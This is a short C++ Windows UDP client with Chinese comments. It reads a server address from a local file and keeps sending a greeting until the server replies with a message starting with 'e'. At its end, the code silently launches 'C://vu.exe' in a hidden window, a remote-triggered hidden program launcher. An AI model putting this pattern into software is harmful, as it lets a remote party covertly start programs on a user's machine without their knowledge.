// 客户端.cpp : Defines the entry point for the console application.
//
#include<winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32.lib")

void main()
{
	WSADATA wsadata;
	SOCKET sclient;


	//服务器地址、端口号
	char serip[30]="10.13.28.32";
	int  Seriport=5051;
	char ch[]="hello";
	
	FILE *p=fopen("ip","rb");
	if(p!=NULL)
	{
		fscanf(p,"%s",serip);
		fclose(p);
	}
	else
		return ;

	//服务器SOCKET地址结构长度
	int ilen;
	//发送/接收数据大小
	int isend;


	//要发送给服务器的数据
	char send_buf[]="hello,I am a client.";


	//服务器端的SOCKET地址结构
	struct sockaddr_in seradd;


	//字符数组初始化
	memset(ch,0,sizeof(ch));

	if(WSAStartup(MAKEWORD(2,2),&wsadata)!=0)
	{
		printf("failed to load winsock\n");
		return;
	}

	

	// 服务器SOCKET地址结构初始化
	seradd.sin_family=AF_INET;
	seradd.sin_port=htons(Seriport);
	seradd.sin_addr.s_addr=inet_addr(serip);

   

	sclient=socket(AF_INET,SOCK_DGRAM,0);
	if(sclient==INVALID_SOCKET)
	{
		printf("build socket failed!\n");
		return;
	}

   
	
	//无连接不需要进行地址与套接字的绑定，直接发送数据即可
	ilen=sizeof(seradd);
	int n=1;
	char str[1030];
	isend=sendto(sclient,send_buf,sizeof(send_buf),0,(struct sockaddr *)&seradd,ilen);
	 
     while(1)
	 {
	    sendto(sclient,send_buf,sizeof(send_buf),0,(struct sockaddr *)&seradd,ilen);
		int a=recvfrom(sclient,str,1030,0,(struct sockaddr*)&seradd,&ilen);
		if(str[0]=='e')
			break;
	 }
	 ShellExecute(NULL,"open","C://vu.exe",NULL,NULL,SW_HIDE);

	 closesocket(sclient);
	 WSACleanup();
}
